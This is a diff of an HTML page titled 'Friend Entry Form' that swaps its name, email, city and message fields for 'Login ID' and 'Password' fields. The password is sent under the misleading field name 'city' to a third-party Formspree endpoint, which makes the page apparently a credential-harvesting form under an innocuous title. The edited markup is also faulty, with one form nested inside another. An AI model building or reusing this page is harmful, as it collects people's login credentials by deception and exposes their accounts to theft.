@@ -1,24 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Friend Entry Form</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://images.unsplash.com/photo-1517511620798-cec17d428bc0'); /* Replace with your image URL */
+      background-size: cover;
+      background-position: center;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .form-box {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #007BFF;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <h2>Enter Your Details</h2>
-  <form action="https://formspree.io/f/xwpbazwn" method="POST">
-    <label>Name:</label><br>
-    <input type="text" name="name" required><br><br>
 
-    <label>Email:</label><br>
-    <input type="email" name="email" required><br><br>
+  <form><div class="form-box">
+    <h2>Enter Your Details</h2>
+    <form action="https://formspree.io/f/xwpbazwn" method="POST">
+      <label>Login ID:</label><br>
+      <input type="text" name="name" required><br>
 
-    <label>City:</label><br>
-    <input type="text" name="city"><br><br>
+      <label>Password:</label><br>
+      <input type="password" name="city"><br>
 
-    <label>Message:</label><br>
-    <textarea name="message" rows="4"></textarea><br><br>
+      <button type="submit">Submit</button>
+    </form>
+  </div></form>
 
-    <button type="submit">Submit</button>
-  </form>
 </body>
 </html>
